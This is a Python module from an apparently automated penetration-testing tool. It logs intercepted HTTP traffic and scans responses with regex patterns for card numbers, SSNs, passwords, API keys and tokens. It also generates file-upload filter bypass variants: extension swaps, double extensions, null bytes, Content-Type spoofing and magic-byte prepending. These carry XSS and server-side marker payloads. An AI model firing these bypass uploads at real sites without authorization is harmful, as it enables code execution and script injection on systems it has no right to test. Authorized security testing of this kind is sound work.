"""
JARWIS AGI PEN TEST - Proxy Interceptor
mitmproxy-based traffic interception and analysis
"""

import asyncio
import logging
import json
import re
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime
import threading

logger = logging.getLogger(__name__)


@dataclass
class InterceptedRequest:
    """Represents an intercepted HTTP request/response pair"""
    id: str
    timestamp: str
    url: str
    method: str
    request_headers: Dict
    request_body: Optional[str]
    response_status: int = 0
    response_headers: Dict = field(default_factory=dict)
    response_body: str = ""
    content_type: str = ""
    is_api: bool = False
    has_upload: bool = False
    parameters: Dict = field(default_factory=dict)


class ProxyInterceptor:
    """Intercepts and analyzes HTTP traffic via mitmproxy"""
    
    def __init__(self, host: str = "127.0.0.1", port: int = 8080):
        self.host = host
        self.port = port
        self.requests: List[InterceptedRequest] = []
        self.running = False
        self._request_id = 0
        self._callbacks: List[Callable] = []
        self._sensitive_patterns = [
            r'\b\d{16}\b',  # Credit card
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
            r'password["\s:=]+["\']?[\w@#$%^&*]+',
            r'api[_-]?key["\s:=]+["\']?[\w-]+',
            r'secret["\s:=]+["\']?[\w-]+',
            r'token["\s:=]+["\']?[\w.-]+',
            r'bearer\s+[\w.-]+',
        ]
        
    async def start(self):
        """Start the proxy server"""
        self.running = True
        logger.info(f"Proxy interceptor ready on {self.host}:{self.port}")
        # Note: In production, this would start mitmproxy
        # For this implementation, we rely on browser's request interception
    
    async def stop(self):
        """Stop the proxy server"""
        self.running = False
        logger.info("Proxy interceptor stopped")
    
    def add_callback(self, callback: Callable):
        """Add a callback for intercepted requests"""
        self._callbacks.append(callback)
    
    def process_request(
        self,
        url: str,
        method: str,
        headers: Dict,
        body: Optional[str] = None
    ) -> InterceptedRequest:
        """Process an intercepted request"""
        self._request_id += 1
        
        request = InterceptedRequest(
            id=f"REQ-{self._request_id:06d}",
            timestamp=datetime.now().isoformat(),
            url=url,
            method=method,
            request_headers=headers,
            request_body=body,
            content_type=headers.get('content-type', ''),
            is_api=self._is_api_request(url, headers),
            has_upload='multipart/form-data' in headers.get('content-type', ''),
            parameters=self._extract_parameters(url, body, headers.get('content-type', ''))
        )
        
        self.requests.append(request)
        
        # Trigger callbacks
        for callback in self._callbacks:
            try:
                callback(request)
            except Exception as e:
                logger.error(f"Callback error: {e}")
        
        return request
    
    def process_response(
        self,
        request_id: str,
        status: int,
        headers: Dict,
        body: str
    ):
        """Process the response for a request"""
        for req in self.requests:
            if req.id == request_id:
                req.response_status = status
                req.response_headers = headers
                req.response_body = body
                break
    
    def _is_api_request(self, url: str, headers: Dict) -> bool:
        """Determine if request is an API call"""
        url_lower = url.lower()
        content_type = headers.get('content-type', '').lower()
        accept = headers.get('accept', '').lower()
        
        return any([
            '/api/' in url_lower,
            '/graphql' in url_lower,
            '/rest/' in url_lower,
            'application/json' in content_type,
            'application/json' in accept,
            'x-requested-with' in headers
        ])
    
    def _extract_parameters(
        self,
        url: str,
        body: Optional[str],
        content_type: str
    ) -> Dict:
        """Extract parameters from URL and body"""
        params = {}
        
        # URL parameters
        if '?' in url:
            query_string = url.split('?', 1)[1]
            for param in query_string.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[f"query.{key}"] = value
        
        # Body parameters
        if body:
            if 'application/json' in content_type:
                try:
                    json_data = json.loads(body)
                    self._flatten_json(json_data, params, 'body')
                except:
                    pass
            elif 'application/x-www-form-urlencoded' in content_type:
                for param in body.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[f"body.{key}"] = value
        
        return params
    
    def _flatten_json(self, data, result: Dict, prefix: str):
        """Flatten nested JSON for parameter extraction"""
        if isinstance(data, dict):
            for key, value in data.items():
                self._flatten_json(value, result, f"{prefix}.{key}")
        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._flatten_json(item, result, f"{prefix}[{i}]")
        else:
            result[prefix] = str(data)
    
    def find_sensitive_data(self) -> List[Dict]:
        """Scan intercepted traffic for sensitive data exposure"""
        findings = []
        
        for req in self.requests:
            # Check response body
            for pattern in self._sensitive_patterns:
                matches = re.findall(pattern, req.response_body, re.IGNORECASE)
                if matches:
                    findings.append({
                        'request_id': req.id,
                        'url': req.url,
                        'pattern': pattern,
                        'matches': matches[:5],  # Limit to first 5
                        'location': 'response_body'
                    })
        
        return findings
    
    def get_endpoints_by_type(self, endpoint_type: str) -> List[InterceptedRequest]:
        """Get endpoints filtered by type"""
        if endpoint_type == 'api':
            return [r for r in self.requests if r.is_api]
        elif endpoint_type == 'upload':
            return [r for r in self.requests if r.has_upload]
        elif endpoint_type == 'post':
            return [r for r in self.requests if r.method == 'POST']
        else:
            return self.requests
    
    def export_har(self, filepath: str):
        """Export intercepted traffic as HAR file"""
        har = {
            "log": {
                "version": "1.2",
                "creator": {"name": "JARWIS AGI PEN TEST", "version": "1.0"},
                "entries": []
            }
        }
        
        for req in self.requests:
            entry = {
                "startedDateTime": req.timestamp,
                "request": {
                    "method": req.method,
                    "url": req.url,
                    "headers": [{"name": k, "value": v} for k, v in req.request_headers.items()],
                    "postData": {"text": req.request_body or ""}
                },
                "response": {
                    "status": req.response_status,
                    "headers": [{"name": k, "value": v} for k, v in req.response_headers.items()],
                    "content": {"text": req.response_body}
                }
            }
            har["log"]["entries"].append(entry)
        
        with open(filepath, 'w') as f:
            json.dump(har, f, indent=2)
        
        logger.info(f"HAR file exported to {filepath}")
    
    def get_unique_endpoints(self) -> List[Dict]:
        """Get deduplicated list of endpoints"""
        seen = set()
        unique = []
        
        for req in self.requests:
            # Create a signature without parameters
            base_url = req.url.split('?')[0]
            sig = f"{req.method}:{base_url}"
            
            if sig not in seen:
                seen.add(sig)
                unique.append({
                    'url': base_url,
                    'method': req.method,
                    'is_api': req.is_api,
                    'has_upload': req.has_upload,
                    'parameters': list(req.parameters.keys())
                })
        
        return unique


class FileUploadMITM:
    """
    MITM Interceptor for file upload bypass testing.
    Intercepts file uploads and modifies them to test bypass techniques.
    """
    
    # Bypass techniques to apply to uploaded files
    BYPASS_TECHNIQUES = [
        # Extension bypasses
        {'original': '.jpg', 'bypass': '.html', 'technique': 'extension_swap'},
        {'original': '.png', 'bypass': '.php', 'technique': 'extension_swap'},
        {'original': '.gif', 'bypass': '.asp', 'technique': 'extension_swap'},
        
        # Double extensions
        {'suffix': '.jpg', 'technique': 'double_ext_before'},  # file.html.jpg
        {'suffix': '.png', 'technique': 'double_ext_before'},  # file.php.png
        
        # Null byte injection (legacy)
        {'inject': '%00.jpg', 'technique': 'null_byte'},  # file.html%00.jpg
        {'inject': '\x00.png', 'technique': 'null_byte_raw'},
        
        # Case manipulation
        {'technique': 'case_bypass'},  # file.HtMl, file.PhP
        
        # Content-Type manipulation
        {'content_type': 'image/jpeg', 'technique': 'content_type_spoof'},
        {'content_type': 'image/png', 'technique': 'content_type_spoof'},
        {'content_type': 'image/gif', 'technique': 'content_type_spoof'},
        
        # Magic bytes injection
        {'magic': b'\xFF\xD8\xFF\xE0', 'technique': 'jpeg_magic'},  # JPEG magic bytes
        {'magic': b'\x89PNG\r\n\x1a\n', 'technique': 'png_magic'},  # PNG magic bytes
        {'magic': b'GIF89a', 'technique': 'gif_magic'},  # GIF magic bytes
    ]
    
    # Malicious payloads for different file types
    MALICIOUS_PAYLOADS = {
        'html': b'<script>alert("XSS-JARWIS")</script>',
        'php': b'<?php echo "RCE-JARWIS"; ?>',
        'asp': b'<% Response.Write("RCE-JARWIS") %>',
        'aspx': b'<%@ Page Language="C#" %><%Response.Write("RCE-JARWIS");%>',
        'jsp': b'<%= "RCE-JARWIS" %>',
        'svg': b'<svg onload="alert(\'XSS-JARWIS\')">',
    }
    
    def __init__(self):
        self.intercepted_uploads: List[Dict] = []
        self.bypass_results: List[Dict] = []
        self._id = 0
        
    def intercept_upload(
        self,
        url: str,
        original_filename: str,
        original_content: bytes,
        original_content_type: str
    ) -> List[Dict]:
        """
        Intercept a file upload and generate bypass variants.
        Returns list of modified upload payloads to test.
        """
        self._id += 1
        
        bypass_variants = []
        base_name = original_filename.rsplit('.', 1)[0] if '.' in original_filename else original_filename
        original_ext = '.' + original_filename.rsplit('.', 1)[1] if '.' in original_filename else ''
        
        # Log the interception
        self.intercepted_uploads.append({
            'id': self._id,
            'url': url,
            'original_filename': original_filename,
            'original_size': len(original_content),
            'original_type': original_content_type
        })
        
        for technique in self.BYPASS_TECHNIQUES:
            variant = self._apply_bypass_technique(
                base_name, original_ext, original_content, 
                original_content_type, technique
            )
            if variant:
                bypass_variants.append(variant)
        
        logger.info(f"Generated {len(bypass_variants)} bypass variants for {original_filename}")
        return bypass_variants
    
    def _apply_bypass_technique(
        self,
        base_name: str,
        original_ext: str,
        content: bytes,
        content_type: str,
        technique: Dict
    ) -> Optional[Dict]:
        """Apply a specific bypass technique to create a variant"""
        
        tech_type = technique.get('technique', '')
        
        if tech_type == 'extension_swap':
            # Replace extension with malicious one
            new_ext = technique.get('bypass', '.html')
            payload_type = new_ext.strip('.')
            new_content = self.MALICIOUS_PAYLOADS.get(payload_type, content)
            return {
                'filename': f"{base_name}{new_ext}",
                'content': new_content,
                'content_type': content_type,  # Keep original CT
                'technique': f"Extension swap: {original_ext} â†' {new_ext}"
            }
        
        elif tech_type == 'double_ext_before':
            # Add image extension after malicious one: file.html.jpg
            suffix = technique.get('suffix', '.jpg')
            for payload_type, payload in self.MALICIOUS_PAYLOADS.items():
                return {
                    'filename': f"{base_name}.{payload_type}{suffix}",
                    'content': payload,
                    'content_type': content_type,
                    'technique': f"Double extension: .{payload_type}{suffix}"
                }
        
        elif tech_type == 'null_byte':
            # Inject null byte: file.html%00.jpg
            inject = technique.get('inject', '%00.jpg')
            return {
                'filename': f"{base_name}.html{inject}",
                'content': self.MALICIOUS_PAYLOADS['html'],
                'content_type': 'image/jpeg',
                'technique': f"Null byte injection: {inject}"
            }
        
        elif tech_type == 'case_bypass':
            # Case manipulation: file.HtMl
            for payload_type, payload in list(self.MALICIOUS_PAYLOADS.items())[:3]:
                mixed_ext = ''.join(
                    c.upper() if i % 2 else c.lower() 
                    for i, c in enumerate(payload_type)
                )
                return {
                    'filename': f"{base_name}.{mixed_ext}",
                    'content': payload,
                    'content_type': content_type,
                    'technique': f"Case bypass: .{mixed_ext}"
                }
        
        elif tech_type == 'content_type_spoof':
            # Spoof content-type while keeping malicious extension
            spoofed_ct = technique.get('content_type', 'image/jpeg')
            return {
                'filename': f"{base_name}.html",
                'content': self.MALICIOUS_PAYLOADS['html'],
                'content_type': spoofed_ct,
                'technique': f"Content-Type spoof: {spoofed_ct}"
            }
        
        elif tech_type in ['jpeg_magic', 'png_magic', 'gif_magic']:
            # Prepend magic bytes to malicious content
            magic = technique.get('magic', b'')
            html_payload = self.MALICIOUS_PAYLOADS['html']
            return {
                'filename': f"{base_name}.html",
                'content': magic + b'\n' + html_payload,
                'content_type': 'image/jpeg',
                'technique': f"Magic bytes: {tech_type}"
            }
        
        return None
    
    def record_bypass_result(
        self,
        url: str,
        technique: str,
        filename: str,
        success: bool,
        response_status: int,
        uploaded_path: Optional[str] = None
    ):
        """Record the result of a bypass attempt"""
        self.bypass_results.append({
            'url': url,
            'technique': technique,
            'filename': filename,
            'success': success,
            'response_status': response_status,
            'uploaded_path': uploaded_path,
            'exploitable': success and uploaded_path is not None
        })
    
    def get_successful_bypasses(self) -> List[Dict]:
        """Get all successful bypass attempts"""
        return [r for r in self.bypass_results if r['success']]
    
    def get_exploitable_bypasses(self) -> List[Dict]:
        """Get bypasses that resulted in accessible uploaded files"""
        return [r for r in self.bypass_results if r.get('exploitable')]
